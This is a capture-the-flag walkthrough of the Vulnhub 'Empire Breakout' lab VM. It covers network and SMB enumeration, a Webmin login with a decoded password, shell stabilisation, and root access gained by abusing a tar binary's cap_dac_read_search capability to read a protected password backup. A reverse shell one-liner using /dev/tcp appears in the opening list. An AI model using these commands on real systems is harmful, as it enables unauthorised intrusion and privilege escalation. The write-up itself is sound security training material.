# Vulnhub Empire Breakout


Vulnhub Training Waklthrough -- Empire Breakout

<!--more-->

## Knowledge

- enum4linux -- enumeration of smb service
- reverse shell -- sh -i /dev/tcp/IP/port 0>&1
- getcap -- read the file's capability

## 1. Environment Setup

Download the [zip file](https://download.vulnhub.com/empire/02-Breakout.zip), setup the network to NAT, open with VMware.

## 2. Reconnaisence

### 1. IP Address

arp-scan scanner:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	VMware, Inc.
172.16.86.149	00:0c:29:c7:9d:d8	VMware, Inc.
172.16.86.254	00:50:56:fa:b5:64	VMware, Inc.

8 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.385 seconds (107.34 hosts/sec). 4 responded
```

### 2. Port Info

nmap scanner:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ nmap -T4 -sC -sV -p- --open -oN nmap_scan 172.16.86.149
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-13 06:31 EST
Nmap scan report for 172.16.86.149
Host is up (0.0015s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-server-header: MiniServ/1.830
|_http-title: 200 &mdash; Document follows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2023-11-13T11:31:32
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.05 seconds
```

Enabled port:

| port  | service      |
| ----- | ------------ |
| 80    | http web     |
| 139   | smb          |
| 445   | smb          |
| 10000 | Webmin 1.981 |
| 20000 | Webmin 1.830 |

Access the web page, we get the info in the bottom of page:

![image-20231113192020417](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131920525.png)

It's brainfuck encoded, decode it, and we got string:

```shell
.2uqPEfj3D<P'a-3
```

Maybe it is some password.

Access the 10000 and 20000 port, it is two login page, need username and password:

![image-20231113193638511](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131936665.png)

### 3. Web Directory

Consider list the web directory:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ gobuster dir -u http://172.16.86.149:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.149:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 315] [--> http://172.16.86.149/manual/]
/server-status        (Status: 403) [Size: 278]
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing found.

## 3. Exploit

### 1. Enumeration

The target has smb service, so enumerate it with `enum4linux`:

```shell
┌──(v4ler1an㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─$ enum4linux -a 172.16.86.149
perl: warning: Setting locale failed.
perl: warning: Please check that your locale settings:
	LANGUAGE = (unset),
	LC_ALL = (unset),
	LC_CTYPE = "UTF-8",
	LC_TERMINAL = "iTerm2",
	LANG = (unset)
    are supported and installed on your system.
perl: warning: Falling back to the standard locale ("C").
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 13 06:24:30 2023

 =========================================( Target Information )=========================================

Target ........... 172.16.86.149
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 172.16.86.149 )===========================


[+] Got domain/workgroup name: WORKGROUP

... ...
 ==================( Users on 172.16.86.149 via RID cycling (RIDS: 500-550,1000-1050) )==================


[I] Found new SID:
S-1-22-1

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[I] Found new SID:
S-1-5-32

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1000 Unix User\cyber (Local User)

[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''

S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

 ===============================( Getting printer info for 172.16.86.149 )===============================

No printers returned.


enum4linux complete on Mon Nov 13 06:25:06 2023
```

And we got a user named `cyber`.

Now, we use the `cyber/.2uqPEfj3D<P'a-3` to try to login webmin, and we can login sucess in 20000 port, and we can get a shell:

![image-20231113194558547](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131945698.png)

### 2. Stabilish Shell

We can get a reverse shell follow the command:

![image-20231113195342116](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131953275.png)

And then, we can stabilish it with the method:

```shell
export TERM=xterm
python3 -c "import pty;pty.spawn('/bin/bash')"
(press CTRL+Z)
stty raw -echo;fg;reset
```

![image-20231113195709791](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131957963.png)

## 4. Privilege Escalation

There is a `tar` file in cyber directory, and it's privilege is root:

```shell
cyber@breakout:~$ ls -la tar
-rwxr-xr-x 1 root root 531928 Oct 19  2021 tar
```

And then, we can doing a little bit of enumeration on the machine, we can see that there is a old_pass.bak file located in /var/backups but we don’t have the required permissions to view the file contents:

```shell
cyber@breakout:/var/backups$ ls -la
total 480
drwxr-xr-x  2 root root   4096 Nov 13 06:27 .
drwxr-xr-x 14 root root   4096 Oct 19  2021 ..
-rw-r--r--  1 root root  40960 Nov 13 06:25 alternatives.tar.0
-rw-r--r--  1 root root  12732 Oct 19  2021 apt.extended_states.0
-rw-r--r--  1 root root      0 Nov 13 06:25 dpkg.arch.0
-rw-r--r--  1 root root    186 Oct 19  2021 dpkg.diversions.0
-rw-r--r--  1 root root    135 Oct 19  2021 dpkg.statoverride.0
-rw-r--r--  1 root root 413488 Oct 19  2021 dpkg.status.0
-rw-------  1 root root     17 Oct 20  2021 .old_pass.bak
cyber@breakout:/var/backups$ cat .old_pass.bak
cat: .old_pass.bak: Permission denied
```

return the `tar` file, it has the unnomal capability, learn capabilities more at [here](https://man7.org/linux/man-pages/man7/capabilities.7.html). Just check it:

```shell
cyber@breakout:~$ getcap tar
tar cap_dac_read_search=ep
```

The capability of `tar` file is `cap_dac_read_search`, It means that it can read all the files on the system irrespective of their permissions.

We can compress the contents of the old_pass.bak file in a tarball and then extract it. This should provide us the the required permissions to view the contents of the file.

```shell
cyber@breakout:~$ ./tar -cf pass.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
cyber@breakout:~$ ls -la
total 580
drwxr-xr-x  8 cyber cyber   4096 Nov 13 07:05 .
drwxr-xr-x  3 root  root    4096 Oct 19  2021 ..
-rw-------  1 cyber cyber      0 Oct 20  2021 .bash_history
-rw-r--r--  1 cyber cyber    220 Oct 19  2021 .bash_logout
-rw-r--r--  1 cyber cyber   3526 Oct 19  2021 .bashrc
drwxr-xr-x  2 cyber cyber   4096 Oct 19  2021 .filemin
drwx------  2 cyber cyber   4096 Oct 19  2021 .gnupg
drwxr-xr-x  3 cyber cyber   4096 Oct 19  2021 .local
-rw-r--r--  1 cyber cyber  10240 Nov 13 07:05 pass.tar
-rw-r--r--  1 cyber cyber    807 Oct 19  2021 .profile
drwx------  2 cyber cyber   4096 Oct 19  2021 .spamassassin
-rwxr-xr-x  1 root  root  531928 Oct 19  2021 tar
drwxr-xr-x  2 cyber cyber   4096 Oct 20  2021 .tmp
drwx------ 17 cyber cyber   4096 Nov 13 06:35 .usermin
-rw-r--r--  1 cyber cyber     48 Oct 19  2021 user.txt
cyber@breakout:~$ ls
pass.tar  tar  user.txt
cyber@breakout:~$ tar -xf ./pass.tar
cyber@breakout:~$ ls
pass.tar  tar  user.txt  var
cyber@breakout:~$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```

And then switch to root:

```shell
cyber@breakout:~$ su
Password:
root@breakout:/home/cyber# id
uid=0(root) gid=0(root) groups=0(root)
root@breakout:/home/cyber# ls -la /root
total 40
drwx------  6 root root 4096 Oct 20  2021 .
drwxr-xr-x 18 root root 4096 Oct 19  2021 ..
-rw-------  1 root root  281 Oct 20  2021 .bash_history
-rw-r--r--  1 root root  571 Apr 10  2021 .bashrc
drwxr-xr-x  3 root root 4096 Oct 19  2021 .local
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r--r--  1 root root  100 Oct 19  2021 rOOt.txt
drwx------  2 root root 4096 Oct 19  2021 .spamassassin
drwxr-xr-x  2 root root 4096 Oct 19  2021 .tmp
drwx------  6 root root 4096 Oct 19  2021 .usermin
root@breakout:/home/cyber# cat /root/rOOt.txt
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}

Author: Icex64 & Empire Cybersecurity
```

## Notes


